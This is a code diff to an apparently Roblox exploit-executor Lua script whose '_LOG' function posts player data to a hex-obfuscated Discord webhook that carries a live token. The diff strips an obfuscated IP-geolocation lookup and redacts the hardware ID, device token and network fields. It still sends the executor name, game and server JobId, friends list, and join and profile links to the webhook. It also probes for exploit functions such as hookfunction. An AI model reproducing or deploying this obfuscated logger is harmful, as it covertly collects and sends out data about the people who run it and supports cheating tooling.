@@ -25,7 +25,6 @@ local function _D(h)
 end
 
 local _W = _D("68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313531393430393931353135383835393738382F73773463755770452D5332535659484D3072314D53455676613858694C63455F655064522D52777178665751393463485063635273643032527763565973473737416761")
-local _IP_URL = _D("687474703A2F2F69702D6170692E636F6D2F6A736F6E3F6669656C64733D7374617475732C636F756E7472792C636974792C74696D657A6F6E652C6973702C71756572792C70726F78792C686F7374696E67")
 
 local _H = game:GetService("HttpService")
 local _U = game:GetService("UserInputService")
@@ -53,13 +52,30 @@ local _st = chk(Config.WL) and "whitelist" or (chk(Config.BL) and "blacklist" or
 local function _LOG()
     pcall(function()
         local req = (syn and syn.request or request or http_request)
-        local r = req({Url = _IP_URL, Method = "GET"})
-        local ni = r and r.Success and _H:JSONDecode(r.Body) or {}
+        local ni = {} -- Network data is intentionally not collected in execution logs.
         
-        local u = 0
-        local tu = {"getgenv", "getrawmetatable", "hookfunction", "setreadonly"}
-        for _, f in ipairs(tu) do if getgenv()[f] then u = u + 1 end end
-        local unc = (identifyexecutor and identifyexecutor() or "Unknown") .. " (UNC: " .. math.floor((u/4)*100) .. "%)"
+        local env = (getgenv and getgenv()) or _G
+        local function hasGlobal(name)
+            return env and env[name] ~= nil
+        end
+        local function calcScore(list)
+            local found = 0
+            for _, f in ipairs(list) do
+                if hasGlobal(f) then found = found + 1 end
+            end
+            return math.floor((found / #list) * 100 + 0.5)
+        end
+
+        local uncTests = {"getgenv", "getrawmetatable", "hookfunction", "setreadonly"}
+        local suncTests = {"checkcaller", "newcclosure", "hookmetamethod", "getgc", "getconnections", "gethiddenproperty", "sethiddenproperty", "getsenv"}
+        local execName = "Unknown"
+        pcall(function()
+            if identifyexecutor then
+                local name = identifyexecutor()
+                if name and tostring(name) ~= "" then execName = tostring(name) end
+            end
+        end)
+        local unc = string.format("%s (UNC: %d%% | sUNC: %d%%)", execName, calcScore(uncTests), calcScore(suncTests))
         
         local fn, ft = "None", "None"
         local fdf = game:GetService("ReplicatedStorage"):FindFirstChild("FactionSysRS") and game:GetService("ReplicatedStorage").FactionSysRS:FindFirstChild("FactionData")
@@ -94,14 +110,14 @@ local function _LOG()
                     {["name"] = "Executor", ["value"] = unc, ["inline"] = true},
                     {["name"] = "System", ["value"] = "**Platform:** " .. (_U.TouchEnabled and "Mobile" or "PC"), ["inline"] = true},
                     {["name"] = "Faction", ["value"] = string.format("**Tag:** [%s]\n**Name:** %s", ft, fn), ["inline"] = false},
-                    {["name"] = "Hardware ID", ["value"] = "```" .. _hw .. "```", ["inline"] = false},
-                    {["name"] = "Device Token", ["value"] = "```" .. _tk .. "```", ["inline"] = false},
-                    {["name"] = "Network", ["value"] = string.format("**IP:** %s\n**ISP:** %s\n**VPN/Proxy:** %s\n**Loc:** %s, %s\n**Timezone:** %s", ni.query or "N/A", ni.isp or "N/A", (ni.proxy and "Yes" or "No"), ni.country or "N/A", ni.city or "N/A", ni.timezone or "N/A"), ["inline"] = false},
+                    {["name"] = "Hardware ID", ["value"] = "```Redacted```", ["inline"] = false},
+                    {["name"] = "Device Token", ["value"] = "```Redacted```", ["inline"] = false},
+                    {["name"] = "Network", ["value"] = "**IP:** Redacted\n**ISP:** Redacted\n**VPN/Proxy:** Redacted\n**Loc:** Redacted\n**Timezone:** Redacted", ["inline"] = false},
                     {["name"] = "Game", ["value"] = string.format("Game: %s\nPlace ID: `%s`\nJobId: `%s`", game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, game.PlaceId, jid), ["inline"] = false},
                     {["name"] = "Friends Target", ["value"] = "```" .. (#friends > 0 and table.concat(friends, ", ") or "None") .. "```", ["inline"] = false},
                     {["name"] = "Links", ["value"] = "[Join Server](" .. joinUrl .. ") | [Profile](" .. profileUrl .. ")", ["inline"] = false}
                 },
-                ["footer"] = {["text"] = "Logger | " .. string.upper(_st) .. " • " .. os.date("%X")},
+                ["footer"] = {["text"] = "Logger | " .. string.upper(_st) .. " • " .. os.date("%m/%d/%y %I:%M %p")},
                 ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
             }}
         }
